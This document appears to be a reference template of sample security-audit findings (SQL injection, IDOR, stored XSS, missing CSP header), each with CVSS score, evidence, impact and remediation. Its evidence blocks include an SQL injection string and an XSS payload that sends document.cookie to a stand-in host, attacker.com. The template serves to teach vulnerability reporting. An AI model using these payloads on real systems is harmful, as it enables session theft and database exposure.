# Finding Examples

Reference examples showing the expected quality and format for each severity level.

---

## Critical — SQL Injection

**Title:** SQL Injection in /api/v2/search Allows Full Database Dump

**Severity:** Critical
*Justification: Unauthenticated, directly exploitable, exposes entire database including credentials and PII.*

**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — 9.8 (Critical)

**Description:** The `/api/v2/search` endpoint accepts a `q` parameter that is concatenated directly into a SQL query without sanitization. An unauthenticated attacker can inject arbitrary SQL to extract, modify, or delete data from the database.

**Evidence:**
```
GET /api/v2/search?q=test'+OR+'1'='1 HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
[{"id":1,"email":"admin@target.com","password_hash":"$2b$..."},{"id":2,...}]
```

**Impact:** Full read and write access to the application database. An attacker can extract all user credentials, PII, and session tokens, and modify or delete any record.

**Recommendation:** Replace string concatenation with parameterized queries or prepared statements for every database-facing function. Apply immediately to `/api/v2/search` and audit all other query-building code paths.

**References:** CWE-89, OWASP A03:2021 — Injection

---

## High — IDOR

**Title:** IDOR on /api/invoices/{id} Exposes Other Users' Financial Records

**Severity:** High
*Justification: Authenticated but no authorization check — any user can access any invoice by incrementing the ID.*

**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` — 6.5 (High)

**Description:** The `/api/invoices/{id}` endpoint returns invoice details without verifying that the authenticated user owns the requested invoice. Any authenticated user can enumerate invoice IDs to access billing records belonging to other users.

**Evidence:**
```
GET /api/invoices/1042 HTTP/1.1
Authorization: Bearer [Account B token]

HTTP/1.1 200 OK
{"invoice_id":1042,"owner":"user_A@target.com","amount":4200.00,"card_last4":"9821"}
```
Invoice 1042 belongs to Account A. Request was made with Account B's token.

**Impact:** Any authenticated user can read financial records, card details (last 4), billing addresses, and purchase history of all other users.

**Recommendation:** Validate on every request to `/api/invoices/{id}` that the `invoice.owner_id` matches the authenticated user's ID. Apply the same check to all object-fetching endpoints. Never rely on the client-supplied ID alone.

**References:** CWE-639, OWASP A01:2021 — Broken Access Control

---

## Medium — Stored XSS

**Title:** Stored XSS in Profile Bio Field Targets Other Users' Sessions

**Severity:** Medium
*Justification: Stored but limited to users who view the profile — not a high-traffic page. Requires the attacker to have an account.*

**CVSS:** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` — 5.4 (Medium)

**Description:** The profile bio field on `/settings/profile` stores user-supplied HTML without sanitization. When another user views the attacker's profile, the injected script executes in their browser context.

**Evidence:**
```
POST /settings/profile HTTP/1.1
bio=<script>fetch('https://attacker.com/c?c='+document.cookie)</script>

# Victim visits /profile/attacker123
# Cookie exfiltrated: session=abc123def456
```

**Impact:** Session cookie theft for any user who views the attacker's profile. Can be escalated by targeting an admin.

**Recommendation:** Apply output encoding to all user-supplied content rendered in HTML context. Use a strict Content Security Policy that blocks inline scripts. Strip or reject HTML tags in bio fields using a server-side allowlist.

**References:** CWE-79, OWASP A03:2021 — Injection

---

## Low — Missing Security Headers

**Title:** Missing Content-Security-Policy Header Increases XSS Impact

**Severity:** Low
*Justification: No direct exploitability on its own — a compensating control gap that increases impact of other findings.*

**CVSS:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` — 2.6 (Low)

**Description:** The application does not return a `Content-Security-Policy` header on any response. Without CSP, browsers will execute any injected inline scripts, removing a key browser-level defence against XSS.

**Evidence:**
```
HTTP/1.1 200 OK
Server: nginx
Content-Type: text/html
# No Content-Security-Policy header present
```

**Impact:** Absence of CSP means any successful XSS (including the stored XSS in F-03) has maximum impact — no browser mitigations constrain script execution.

**Recommendation:** Deploy a Content-Security-Policy header with `default-src 'self'` as a baseline. Incrementally tighten to remove `unsafe-inline` once inline scripts are refactored. Use `report-uri` to monitor violations before enforcing.

**References:** CWE-693, OWASP A05:2021 — Security Misconfiguration
